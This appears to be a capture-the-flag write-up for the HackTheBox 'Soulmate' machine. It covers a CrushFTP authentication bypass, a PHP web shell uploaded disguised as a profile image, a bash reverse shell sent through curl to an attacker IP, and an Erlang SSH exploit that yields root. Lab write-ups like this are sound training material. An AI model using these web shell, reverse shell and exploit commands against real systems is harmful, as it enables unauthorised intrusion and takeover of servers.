# Soulmate

\


<figure><img src="https://cdn-images-1.medium.com/max/800/1*UfZ4t_D4nnULwpnc0mbcYg.png" alt=""><figcaption></figcaption></figure>

## Recon

\


<figure><img src="https://cdn-images-1.medium.com/max/800/1*glQHLpGmeSPZzr_8NRehOA.png" alt=""><figcaption></figcaption></figure>

No interesting directories were found on main application **soulmate.htb** after some enumeration vhost was found.

### Vhost Discovery

<figure><img src="https://cdn-images-1.medium.com/max/800/1*rA78vL7rX64flCkpPBRhZg.png" alt=""><figcaption></figcaption></figure>

\


I also tried default creds of crushftp which was crushadmin:crushadmin but they didn’t work out well so, went to hydra but it didn't help.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*T4qL5lE0CUVmDGyYQvm3Ag.png" alt=""><figcaption></figcaption></figure>

\


### Crush-ftp Auth Bypass

\


So i didn’t get any version of the application but i saw this..

\


<figure><img src="https://cdn-images-1.medium.com/max/800/1*fvDVOv18j37t3gcuc_KzcA.png" alt=""><figcaption></figcaption></figure>

It adds a user and gets you login into application.

```
python 52295.py --target ftp.soulmate.htb --exploit --new-user hacker --password hacker  --port 80
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*7J2U-9QufbNbI3R9hOVWmw.png" alt=""><figcaption></figcaption></figure>

We have successfully logged-in as admin.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*Q3TDjGUVziMcWHA_AjhN1g.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*pTaVeRrIsxQaAgQCQ_C3Mw.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*2Dqay4aMtHv_BGMBtXgBbA.png" alt=""><figcaption></figcaption></figure>

There was a telnet client idk how its working.



## Initial Foothold

\


So now go to the admin panel and select files take the folder of **app** to your user and then allow all the permission especially upload,rename. After that upload the file containing php cmd as an png file.

And upload it as a profile image in **soumate.htb**

```
echo '<?php if(isset($_REQUEST["cmd"])) system($_REQUEST["cmd"]); ?>' > shell.p
```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*e9p1T1sJGFx8LbdWmS_8SA.png" alt=""><figcaption></figcaption></figure>

<figure><img src="https://cdn-images-1.medium.com/max/800/1*ZTdVQOCffR5j1swxsMz1oA.png" alt=""><figcaption></figcaption></figure>

Now the uploaded file will be poped up in profiles folder as you already gave permission to rename the file you can change it back into php file.

\


<figure><img src="https://cdn-images-1.medium.com/max/800/1*3Ore7de8XCTUksHDP2pRPA.png" alt=""><figcaption></figcaption></figure>

After that go to the profile pic and click open image at new tab and add ?cmd=\<command> to see if its working

\


<figure><img src="https://cdn-images-1.medium.com/max/800/1*UgH1_RRslaWGU0fK18AYWg.png" alt=""><figcaption></figcaption></figure>

if its working its time to get reverse shell.



### Reverse shell



```
curl "http://soulmate.htb/assets/images/profiles/6_1757710607.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.16.54/9001%200%3E%261'"

```

<figure><img src="https://cdn-images-1.medium.com/max/800/1*2E7pmnEEtLH4m4D1SuH1uw.png" alt=""><figcaption></figcaption></figure>

```
curl "http://soulmate.htb/assets/images/profiles/6_1757710607.php?cmd=bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.10.16.54/9001%200%3E%261'"
```

That’s it we got Shell into the box.

## Root Access

<figure><img src="https://cdn-images-1.medium.com/max/800/1*VnH3v6geO4lGVZWiqQob5g.png" alt=""><figcaption></figcaption></figure>

While enumerating i got this.

Its running a erlang\_ssh.service so i tried to get the version of service.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*fAIzXTA_i_ExnKSuagpQPQ.png" alt=""><figcaption></figcaption></figure>

We got the version now.

\


Get the exploit from github [https://github.com/TeneBrae93/CVE-2025-3243.git](https://github.com/TeneBrae93/CVE-2025-3243.git).

modify the code and this command to spawn a reverse shell.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*nnniaQR8RUk8ZwU-Hg8NZw.png" alt=""><figcaption></figcaption></figure>

\


And transfer it into victim machine.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*MLlnbpSqbhFe-XustJwduw.png" alt=""><figcaption></figcaption></figure>

```
python3 CVE-2025-3243.py -lh 10.10.16.54 -lp 4444 -rh 127.0.0.1 -rp 2222
```

Since the erlang port is running on local host we dont have a choice but to run this on the victim machine .

> Note run this in victim machine -lh is your vpn ip and -lp is your listener ip.

<figure><img src="https://cdn-images-1.medium.com/max/800/1*3_0xssfNOoPnmzuenbs4NA.png" alt=""><figcaption></figcaption></figure>

And that's it we got root on boxx!!!!



{% code fullWidth="true" %}
```awk
                  .----.                                                       
      .---------. | == |
      |.-"""""-.| |----|
      ||       || | == |                                                       
      ||       || |----|                                                      Happy Hacking.....
      |'-.....-'| |::::|
      `"")---(""` |___.|                            
     /:::::::::::\" _  "
    /:::=======:::\`\`\
    `"""""""""""""`  '-'
```
{% endcode %}
